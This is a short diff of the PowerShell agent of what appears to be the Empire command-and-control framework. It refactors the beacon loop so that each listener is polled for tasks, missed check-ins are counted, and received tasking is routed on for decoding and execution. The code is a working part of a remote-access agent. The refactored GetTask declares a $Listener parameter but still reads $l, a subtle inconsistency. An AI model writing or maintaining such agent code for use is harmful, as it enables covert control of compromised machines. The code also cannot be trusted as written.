@@ -824,7 +824,7 @@ function Invoke-Empire {
 			if ($JobResults) {
 				((& $SendMessage -Listener $l -Packets $JobResults))
 			}
-			((& $script:GetTask))
+			((& $script:GetTask -Listener $l))
 		}
 		((& $script:CleanUpListeners))
 	}
@@ -835,18 +835,17 @@ function Invoke-Empire {
 	}
 
 	$script:GetTask = {
-		foreach ($l in $script:listeners){
-			$TaskData = (& $l['get_task_func'])
-			if (!$TaskData){
-				$l['missedCheckins'] += 1
-			}
-			else {
+		param($Listener)
 
-				if ([System.Text.Encoding]::UTF8.GetString($TaskData) -ne $l['defaultResponse']) {
-					Decode-RoutingPacket -PacketData $TaskData
-				}
-				break
+		$TaskData = (& $l['get_task_func'])
+		if (!$TaskData){
+			$l['missedCheckins'] += 1
+		}
+		else {
+			if ([System.Text.Encoding]::UTF8.GetString($TaskData) -ne $l['defaultResponse']) {
+				Decode-RoutingPacket -PacketData $TaskData
 			}
+		}
 	}
 
     # process a single tasking packet extracted from a tasking and execute the functionality
